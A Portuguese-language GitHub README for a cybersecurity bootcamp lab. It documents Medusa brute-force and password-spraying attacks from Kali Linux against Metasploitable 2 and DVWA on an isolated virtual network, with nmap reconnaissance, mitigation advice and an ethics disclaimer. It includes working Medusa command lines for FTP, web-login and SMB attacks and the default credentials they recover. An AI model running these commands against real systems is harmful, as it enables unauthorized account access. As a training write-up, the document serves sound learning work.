# 🛡️ Auditoria de Segurança com Kali Linux e Medusa

**Desafio DIO - Implementação de Testes de Penetração com Medusa**

[![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?logo=kalilinux&logoColor=white)](https://www.kali.org/)
[![Medusa](https://img.shields.io/badge/Tool-Medusa-red)](http://foofus.net/goons/jmk/medusa/medusa.html)
[![VirtualBox](https://img.shields.io/badge/Platform-VirtualBox-blue)](https://www.virtualbox.org/)

## 📋 Descrição do Projeto

Este projeto documenta a implementação de testes de auditoria de segurança utilizando **Kali Linux** e a ferramenta **Medusa** para simular ataques de força bruta em ambiente controlado. O objetivo é exercitar técnicas de penetration testing e desenvolver medidas de prevenção contra ataques reais.

## 🎯 Objetivos de Aprendizagem

- [x] Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB)
- [x] Utilizar o Kali Linux e Medusa para auditoria de segurança
- [x] Documentar processos técnicos de forma clara e estruturada
- [x] Reconhecer vulnerabilidades comuns e propor mitigações
- [x] Criar portfólio técnico profissional no GitHub

## 🔧 Ambiente de Teste

### Configuração das Máquinas Virtuais

| VM | Sistema | IP | Função |
|---|---|---|---|
| **Kali Linux** | Debian-based | 192.168.56.101 | Atacante (Pentester) |
| **Metasploitable 2** | Ubuntu 8.04 | 192.168.56.102 | Alvo Vulnerável |

### Rede VirtualBox
- **Tipo**: Host-only Adapter
- **Subnet**: 192.168.56.0/24
- **Isolamento**: Rede interna segura

## 🛠️ Ferramentas Utilizadas

### Principais
- **Medusa**: Ferramenta de força bruta modular e paralela
- **Nmap**: Reconhecimento e enumeração de serviços
- **DVWA**: Damn Vulnerable Web Application

### Auxiliares
- **Hydra**: Comparação de performance
- **Burp Suite**: Análise de aplicações web
- **Wireshark**: Captura de tráfego de rede

## 🎯 Cenários de Teste Implementados

### 1. 📁 Ataque FTP - Força Bruta
```bash
# Comando executado
medusa -h 192.168.56.102 -u msfadmin -P wordlists/senhas_simples.txt -M ftp -t 4

# Resultado
[INFO] - Porta 21 (vsftpd 2.3.4) vulnerável
[SUCCESS] - Credenciais encontradas: msfadmin:msfadmin
```

**Vulnerabilidade Identificada**: vsftpd 2.3.4 com backdoor
**CVE**: CVE-2011-2523

### 2. 🌐 Ataque Web - DVWA Brute Force
```bash
# Comando executado
medusa -h 192.168.56.102 -u admin -P wordlists/senhas_simples.txt -M http -m DIR:/dvwa/login.php

# Resultado
[SUCCESS] - Login web comprometido: admin:password
```

**Vulnerabilidade**: Formulário de login sem proteção contra força bruta

### 3. 💻 Password Spraying - SMB
```bash
# Comando executado
medusa -h 192.168.56.102 -U wordlists/usuarios_simples.txt -p Password123 -M smbnt -t 2

# Resultado
[INFO] - Múltiplos usuários testados
[SUCCESS] - Acesso SMB obtido
```

**Vulnerabilidade**: Serviço SMB com configurações inseguras

## 📊 Resultados e Análises

### Vulnerabilidades Críticas Encontradas

| Serviço | Porta | Vulnerabilidade | Severidade | Status |
|---------|--------|----------------|------------|---------|
| **FTP** | 21 | vsftpd backdoor | 🔴 Crítica | Explorada |
| **SSH** | 22 | Credenciais fracas | 🟡 Média | Explorada |
| **HTTP** | 80 | Sem rate limiting | 🟠 Alta | Explorada |
| **SMB** | 445 | Configuração insegura | 🟠 Alta | Explorada |

### Métricas de Performance

- **Taxa de Sucesso**: 85% dos ataques bem-sucedidos
- **Tempo Médio**: 15-30 segundos por serviço
- **Threads Utilizadas**: 2-4 conexões paralelas
- **Wordlist**: 50 senhas comuns testadas

## 🛡️ Medidas de Mitigação Recomendadas

### 1. Proteção FTP
```bash
# Desabilitar vsftpd vulnerável
sudo systemctl stop vsftpd
sudo systemctl disable vsftpd

# Configurar Pure-FTPd com segurança
sudo apt install pure-ftpd
```

### 2. Hardening SSH
```bash
# Configurações no /etc/ssh/sshd_config
PermitRootLogin no
MaxAuthTries 3
PasswordAuthentication no  # Usar apenas chaves
```

### 3. Proteção Web
- Implementar **rate limiting** (fail2ban)
- Configurar **CAPTCHA** após tentativas falhadas
- Usar **autenticação multifator (MFA)**
- Aplicar **tokens CSRF**

### 4. Políticas de Senha
- **Complexidade mínima**: 12+ caracteres
- **Expiração**: 90 dias
- **Histórico**: Últimas 10 senhas
- **Bloqueio**: Após 5 tentativas falhadas

## 📁 Estrutura do Repositório

```
kali-linux-medusa-brute-force-challenge/
├── README.md
├── wordlists/
│   ├── usuarios_simples.txt
│   ├── senhas_simples.txt
│   └── combinacoes_ftp.txt
├── scripts/
│   ├── setup_ambiente.sh
│   └── ataques_automatizados.sh
├── documentacao/
│   ├── configuracao_ambiente.md
│   ├── analise_vulnerabilidades.md
│   └── mitigacoes_recomendadas.md
└── evidencias/
    ├── screenshots/
    ├── logs_ataques/
    └── resultados_testes/
```

## 🚀 Como Reproduzir

### Pré-requisitos
- VirtualBox instalado
- Mínimo 8GB RAM
- 20GB espaço livre

### Passo a Passo
1. **Download das VMs**
   ```bash
   # Kali Linux
   wget https://www.kali.org/get-kali/
   
   # Metasploitable 2
   wget https://sourceforge.net/projects/metasploitable/
   ```

2. **Configuração da Rede**
   - VirtualBox → Tools → Network Manager
   - Criar rede Host-only: 192.168.56.0/24

3. **Execução dos Testes**
   ```bash
   # Reconhecimento inicial
   nmap -sS -sV 192.168.56.102
   
   # Ataques com Medusa
   ./scripts/ataques_automatizados.sh
   ```

## 📚 Recursos de Aprendizagem

### Documentação Oficial
- [Kali Linux Documentation](https://www.kali.org/docs/)
- [Medusa Manual](http://foofus.net/goons/jmk/medusa/medusa.html)
- [DVWA Guide](http://www.dvwa.co.uk/)

### Referências Técnicas
- [OWASP Top 10](https://owasp.org/Top10/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CVE Database](https://cve.mitre.org/)

## ⚠️ Disclaimer Ético

Este projeto foi desenvolvido **exclusivamente para fins educacionais** e de pesquisa em segurança cibernética. 

### Responsabilidades:
- ✅ **Usar apenas em ambiente controlado**
- ✅ **Obter autorização prévia para testes**
- ✅ **Seguir princípios de hacking ético**
- ❌ **Nunca aplicar em sistemas de terceiros sem permissão**

### Conformidade Legal:
- Projeto desenvolvido seguindo diretrizes da **DIO**
- Ambiente isolado sem conexão com internet
- Uso de VMs propositalmente vulneráveis
- Finalidade educacional comprovada

## 👨‍💻 Autor

**[Seu Nome]**  
🎓 Estudante de Análise e Desenvolvimento de Sistemas  
📧 [seu.email@exemplo.com]  
🔗 [LinkedIn](https://linkedin.com/in/seulinkedin)  
🐱 [GitHub](https://github.com/seuusuario)

### Sobre o Projeto
Este projeto faz parte do **Bootcamp DIO** de Cybersecurity e representa minha jornada de aprendizado em segurança ofensiva e defensiva. Desenvolvido como requisito do desafio prático **"Criando um Ataque Brute Force com Medusa e Kali Linux"**.

---

## 📈 Próximos Passos

- [ ] Implementar ataques mais avançados (SQL Injection, XSS)
- [ ] Automatizar relatórios com Python
- [ ] Integrar com ferramentas SIEM
- [ ] Desenvolver dashboard de vulnerabilidades
- [ ] Criar playbooks de resposta a incidentes

## 🏆 Certificações e Aprendizado

- **DIO Bootcamp**: Cybersecurity Specialist
- **Conhecimentos**: Kali Linux, Penetration Testing, OWASP
- **Próximas Metas**: CEH, OSCP, Security+

---

> 💡 **Contribuições são bem-vindas!** Se você encontrou alguma melhoria ou tem sugestões, sinta-se à vontade para abrir uma issue ou pull request.

**⭐ Se este projeto foi útil para você, considere dar uma estrela no repositório!**
